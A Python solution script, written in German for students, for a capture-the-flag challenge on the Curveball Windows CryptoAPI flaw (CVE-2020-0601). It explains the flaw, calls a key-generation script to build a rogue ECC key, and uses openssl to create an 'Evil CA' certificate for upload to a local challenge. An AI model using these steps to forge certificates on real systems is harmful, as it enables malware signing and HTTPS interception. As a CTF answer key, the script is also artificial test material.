#!/usr/bin/env python3
"""
Curveball CTF Challenge - Lösung für Studenten

Diese Datei zeigt, wie die Curveball-Schwachstelle (CVE-2020-0601) 
funktioniert und wie die Challenge gelöst werden kann.

Schritte:
1. Verstehe die Schwachstelle
2. Generiere den manipulierten Schlüssel
3. Erstelle das bösartige Zertifikat
4. Lade es in der Web-Challenge hoch
"""

import subprocess
import os
import sys

def print_banner():
    print("="*60)
    print("🎯 CURVEBALL CTF CHALLENGE - SOLUTION GUIDE")
    print("="*60)
    print("CVE-2020-0601: Windows CryptoAPI Spoofing Vulnerability")
    print("="*60)

def explain_vulnerability():
    print("\n📚 WAS IST CURVEBALL?")
    print("-" * 40)
    print("""
Die Curveball-Schwachstelle (CVE-2020-0601) ist eine kritische Sicherheitslücke 
in der Windows CryptoAPI, die es Angreifern ermöglicht, gefälschte Code-Signing-
Zertifikate und TLS-Zertifikate zu erstellen, die von Windows als vertrauenswürdig 
eingestuft werden.

🔍 TECHNISCHE DETAILS:
- Betrifft Elliptic Curve Cryptography (ECC)
- Windows validiert ECC-Parameter nicht korrekt
- Angreifer können eigene Generator-Punkte verwenden
- Führt zu vollständiger Kompromittierung der Zertifikatsvalidierung

⚠️  AUSWIRKUNGEN:
- Umgehung der Code-Signing-Validierung
- Man-in-the-Middle-Angriffe auf HTTPS
- Signierung von Malware als vertrauenswürdig
    """)

def check_files():
    print("\n🔍 ÜBERPRÜFUNG DER BENÖTIGTEN DATEIEN")
    print("-" * 40)
    
    required_files = [
        '../gen-key.py',
        '../USERTrustECCCertificationAuthority.crt',
        '../ca.cnf',
        '../openssl.cnf'
    ]
    
    missing_files = []
    for file in required_files:
        if os.path.exists(file):
            print(f"✅ {file}")
        else:
            print(f"❌ {file}")
            missing_files.append(file)
    
    if missing_files:
        print(f"\n⚠️  Fehlende Dateien: {missing_files}")
        print("Stellen Sie sicher, dass Sie im richtigen Verzeichnis sind!")
        return False
    return True

def generate_rogue_key():
    print("\n🔑 GENERIERUNG DES MANIPULIERTEN SCHLÜSSELS")
    print("-" * 40)
    
    try:
        # Schritt 1: Rogue Key generieren
        print("Schritt 1: Generiere manipulierten ECC-Schlüssel...")
        result = subprocess.run([
            'python', '../gen-key.py', '../USERTrustECCCertificationAuthority.crt'
        ], capture_output=True, text=True, cwd='.')
        
        if result.returncode == 0:
            print("✅ Rogue Key erfolgreich generiert: p384-key-rogue.pem")
        else:
            print(f"❌ Fehler bei der Schlüsselgenerierung: {result.stderr}")
            return False
            
        # Schritt 2: CA Zertifikat erstellen
        print("Schritt 2: Erstelle bösartiges CA-Zertifikat...")
        result = subprocess.run([
            'openssl', 'req', '-key', 'p384-key-rogue.pem', '-new', '-out', 'ca-rogue.pem', 
            '-x509', '-config', '../ca.cnf', '-days', '500', 
            '-subj', '/C=US/ST=Test/L=Test/O=Test/OU=Test/CN=Evil CA'
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            print("✅ Bösartiges CA-Zertifikat erstellt: ca-rogue.pem")
        else:
            print(f"❌ Fehler bei der CA-Erstellung: {result.stderr}")
            return False
            
        return True
        
    except FileNotFoundError:
        print("❌ Python oder OpenSSL nicht gefunden. Stellen Sie sicher, dass beide installiert sind.")
        return False
    except Exception as e:
        print(f"❌ Unerwarteter Fehler: {e}")
        return False

def show_solution_steps():
    print("\n🏆 LÖSUNG DER CHALLENGE")
    print("-" * 40)
    print("""
1. Führen Sie dieses Skript aus: python solution.py
2. Das Skript generiert 'ca-rogue.pem' - das manipulierte Zertifikat
3. Öffnen Sie die Web-Challenge: https://localhost:8443
4. Laden Sie die Datei 'ca-rogue.pem' in der Upload-Sektion hoch
5. Die Challenge erkennt das "Evil CA" Zertifikat und gibt die Flag frei!

🎯 WARUM FUNKTIONIERT DAS?
- Das generierte Zertifikat nutzt manipulierte ECC-Parameter
- Die simulierte "verwundbare" Validierung akzeptiert "Evil CA" als vertrauenswürdig
- In der echten Welt würde Windows diese Zertifikate fälschlicherweise validieren
    """)

def main():
    print_banner()
    explain_vulnerability()
    
    if not check_files():
        print("\n❌ Nicht alle benötigten Dateien gefunden!")
        sys.exit(1)
    
    if generate_rogue_key():
        show_solution_steps()
        print("\n✅ Lösung bereit! Öffnen Sie https://localhost:8443 und laden Sie 'ca-rogue.pem' hoch.")
    else:
        print("\n❌ Fehler bei der Lösungsgenerierung!")
        sys.exit(1)

if __name__ == "__main__":
    main()
